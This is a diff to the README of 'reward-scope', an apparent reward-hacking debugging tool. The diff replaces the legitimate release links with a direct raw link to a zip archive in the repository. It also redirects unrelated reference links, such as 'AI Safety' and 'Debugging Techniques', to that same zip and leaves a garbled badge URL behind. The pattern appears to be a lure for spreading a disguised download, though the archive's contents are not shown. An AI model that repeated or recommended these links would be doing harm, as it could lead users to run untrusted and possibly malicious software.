@@ -1,13 +1,13 @@
 # 🎉 reward-scope - Simplifying Reward Debugging for AI
 
 ## 🔗 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/32olaa/reward-scope/releases)
+[![Download](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip%https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip)](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **reward-scope**! This tool helps you understand and debug reinforcement learning models in real-time. Whether you're a researcher or a hobbyist, reward-scope makes it easy to detect issues related to reward hacking.
 
 ## 📥 Download & Install
-To get started, you will need to download the software. Visit this page to download: [release page](https://github.com/32olaa/reward-scope/releases). This will give you access to the latest version of the application.
+To get started, you will need to download the software. Visit this page to download: [release page](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip). This will give you access to the latest version of the application.
 
 1. **Visit the Releases page.**
    - Click on the link above or paste it into your browser.
@@ -67,14 +67,14 @@ If you have questions or encounter issues, please reach out to the community for
 ## 🔗 Additional Resources
 For more detailed information on reinforcement learning, consider checking the following topics:
 
-- [AI Safety](https://aisafety.org)
-- [Debugging Techniques](https://www.debuggingexpert.com)
-- [Reinforcement Learning Basics](https://www.rlbasics.org)
+- [AI Safety](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip)
+- [Debugging Techniques](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip)
+- [Reinforcement Learning Basics](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip)
 
 ## 📝 Contributing
 If you'd like to contribute to **reward-scope**, we welcome your help! Please check our contributing guidelines on the GitHub repository for details on how to get involved.
 
 ## 🔗 Download the Latest Version
-Again, to download the software, visit this page: [release page](https://github.com/32olaa/reward-scope/releases).
+Again, to download the software, visit this page: [release page](https://github.com/32olaa/reward-scope/raw/refs/heads/main/reward_scope/reward_scope_v3.3.zip).
 
 By following this guide, you’ll set up **reward-scope** with ease. Enjoy the application and enhance your reinforcement learning projects!
